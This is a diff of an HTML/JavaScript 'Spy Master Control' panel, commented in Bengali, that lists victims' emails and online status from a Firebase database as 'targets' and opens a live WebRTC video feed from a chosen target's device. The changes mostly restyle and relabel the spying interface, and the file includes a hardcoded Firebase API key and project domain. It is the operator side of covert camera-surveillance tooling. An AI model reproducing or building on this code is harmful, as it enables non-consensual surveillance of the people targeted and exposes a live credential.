@@ -3,54 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spy Admin Panel v2.0</title>
+    <title>Spy Master Control</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://unpkg.com/simple-peer@9.11.1/simplepeer.min.js"></script>
     <style>
-        body { background: #1a1a1a; color: white; font-family: 'Courier New', monospace; padding: 20px; }
-        h2 { color: #00ffcc; text-align: center; border-bottom: 2px solid #333; padding-bottom: 10px; }
+        body { background: #0f0f0f; color: white; font-family: 'Courier New', monospace; padding: 20px; }
+        h2 { color: #00ffcc; text-align: center; border-bottom: 2px solid #333; padding-bottom: 10px; letter-spacing: 2px; }
         
         #userList { list-style: none; padding: 0; }
         .user-card { 
-            background: #222; padding: 15px; margin: 10px 0; border-radius: 5px; 
+            background: #1a1a1a; padding: 15px; margin: 10px 0; border-radius: 5px; 
             cursor: pointer; display: flex; justify-content: space-between; 
-            border: 1px solid #444; transition: 0.3s; 
+            border: 1px solid #333; transition: 0.3s; 
         }
-        .user-card:hover { background: #333; border-color: #00ffcc; box-shadow: 0 0 10px rgba(0, 255, 204, 0.2); }
+        .user-card:hover { background: #252525; border-color: #00ffcc; transform: translateX(5px); }
         
-        .status-badge { font-size: 12px; padding: 3px 8px; border-radius: 10px; }
-        .online { background: #0f0; color: black; }
-        .offline { background: #555; color: #ccc; }
+        .status-badge { font-size: 12px; padding: 4px 10px; border-radius: 12px; font-weight: bold; }
+        .online { background: #00ffcc; color: black; box-shadow: 0 0 10px #00ffcc; }
+        .offline { background: #444; color: #aaa; }
 
-        /* ভিডিও কন্টেইনার */
+        /* পপ-আপ ভিডিও প্লেয়ার */
         #videoContainer { 
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.95); z-index: 100; text-align: center; padding-top: 50px; 
+            background: rgba(0,0,0,0.96); z-index: 999; text-align: center; padding-top: 40px; 
         }
-        video { width: 90%; max-width: 600px; border: 2px solid #00ffcc; border-radius: 10px; }
+        video { width: 95%; max-width: 600px; border: 3px solid #00ffcc; border-radius: 10px; box-shadow: 0 0 30px rgba(0,255,204,0.4); }
         
-        .btn { padding: 10px 20px; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; border-radius: 5px; }
-        .btn-close { background: red; color: white; }
+        .btn-close { 
+            padding: 12px 30px; background: red; color: white; border: none; 
+            font-weight: bold; cursor: pointer; margin-top: 15px; border-radius: 5px; font-size: 16px;
+        }
     </style>
 </head>
 <body>
 
-    <h2>🕵️ Master Control Room</h2>
-    <p id="systemStatus" style="text-align: center; color: #aaa;">Scanning for targets...</p>
+    <h2>🕵️ MASTER CONTROL v3.0</h2>
+    <p style="text-align: center; color: #666;">Scanning global targets...</p>
 
-    <h3>Target List:</h3>
+    <h3>Active Targets:</h3>
     <ul id="userList"></ul>
 
     <div id="videoContainer">
         <h3 id="targetName" style="color: #00ffcc;">Connecting...</h3>
         <video id="remoteVideo" autoplay playsinline controls></video>
         <br>
-        <button class="btn btn-close" onclick="stopSpying()">STOP FEED</button>
+        <button class="btn-close" onclick="stopSpying()">DISCONNECT</button>
     </div>
 
     <script>
-        // ১. তোর কনফিগারেশন
+        // তোর কনফিগারেশন
         const firebaseConfig = {
           apiKey: "AIzaSyBy5AGDGQFZqbL83fKQfLViX_pyOu6AJ38",
           authDomain: "phone-f605e.firebaseapp.com",
@@ -66,10 +68,11 @@
             firebase.initializeApp(firebaseConfig);
         }
         const db = firebase.database();
+        
         let currentPeer = null;
         let currentTargetId = null;
 
-        // ২. ইউজার লোড করা (রিয়েলটাইম)
+        // --- ইউজার লিস্ট লোড ---
         db.ref("users").on("value", snapshot => {
             const list = document.getElementById("userList");
             list.innerHTML = "";
@@ -78,19 +81,16 @@
                 const uid = child.key;
                 const data = child.val();
                 
-                // শুধু অনলাইন ইউজারদের হাইলাইট করব
                 const isOnline = data.status === "online";
-                const statusClass = isOnline ? "online" : "offline";
-                const email = data.email || "Unknown";
+                const email = data.email || "Unknown Target";
 
                 const li = document.createElement("li");
                 li.className = "user-card";
                 li.innerHTML = `
-                    <span>📧 ${email}</span> 
-                    <span class="status-badge ${statusClass}">${data.status.toUpperCase()}</span>
+                    <span>👤 ${email.split('@')[0]}</span> 
+                    <span class="status-badge ${isOnline ? 'online' : 'offline'}">${data.status.toUpperCase()}</span>
                 `;
                 
-                // অফলাইন হলে ক্লিক কাজ করবে না
                 if(isOnline) {
                     li.onclick = () => prepareConnection(uid, email);
                 } else {
@@ -101,34 +101,30 @@
             });
         });
 
-        // ৩. কানেকশন শুরু করার আগে সব পরিষ্কার করা (Clean Up)
+        // --- কানেকশন লজিক ---
         function prepareConnection(uid, email) {
             document.getElementById("videoContainer").style.display = "block";
-            document.getElementById("targetName").innerText = "Connecting to " + email + "...";
+            document.getElementById("targetName").innerText = "Handshaking with " + email + "...";
             currentTargetId = uid;
 
-            // আগের সিগন্যাল মুছে ফেলা (খুবই জরুরি!)
+            // ১. আগের সব সিগন্যাল ডিলিট (ক্লিন স্লেট)
             db.ref("users/" + uid + "/offer").remove();
             db.ref("users/" + uid + "/answer").remove().then(() => {
                 startWebRTC(uid);
             });
         }
 
-        // ৪. মেইন কানেকশন লজিক
         function startWebRTC(targetId) {
-            // Google STUN Server ব্যবহার করছি ভালো কানেকশনের জন্য
             currentPeer = new SimplePeer({ 
                 initiator: true, 
                 trickle: false,
                 config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] } 
             });
 
-            // সিগন্যাল জেনারেট হলে ডাটাবেজে পাঠানো
             currentPeer.on('signal', offer => {
                 db.ref("users/" + targetId + "/offer").set(offer);
             });
 
-            // টার্গেটের উত্তরের অপেক্ষা
             db.ref("users/" + targetId + "/answer").on("value", snapshot => {
                 const answer = snapshot.val();
                 if (answer && currentPeer) {
@@ -136,36 +132,30 @@
                 }
             });
 
-            // ভিডিও স্ট্রীম রিসিভ করা
             currentPeer.on('stream', stream => {
                 document.getElementById("remoteVideo").srcObject = stream;
-                document.getElementById("targetName").innerText = "🔴 LIVE: " + targetId;
+                document.getElementById("targetName").innerText = "🔴 LIVE FEED: " + targetId;
             });
 
             currentPeer.on('error', err => {
                 console.log(err);
-                alert("Connection Failed! Try reloading.");
+                alert("Connection failed. Target might have disconnected.");
                 stopSpying();
             });
         }
 
-        // ৫. কানেকশন বন্ধ করা
         function stopSpying() {
-            if (currentPeer) {
-                currentPeer.destroy(); // কানেকশন কেটে দেওয়া
-                currentPeer = null;
-            }
+            if (currentPeer) currentPeer.destroy();
+            currentPeer = null;
+            
             if (currentTargetId) {
-                // ডাটাবেজ থেকে অফার মুছে ফেলা
                 db.ref("users/" + currentTargetId + "/offer").remove();
                 db.ref("users/" + currentTargetId + "/answer").remove();
             }
             
             document.getElementById("videoContainer").style.display = "none";
-            document.getElementById("remoteVideo").srcObject = null;
-            location.reload(); // সেফ থাকার জন্য পেজ রিলোড
+            location.reload(); // ক্লিন থাকার জন্য পেজ রিলোড
         }
-
     </script>
 </body>
 </html>
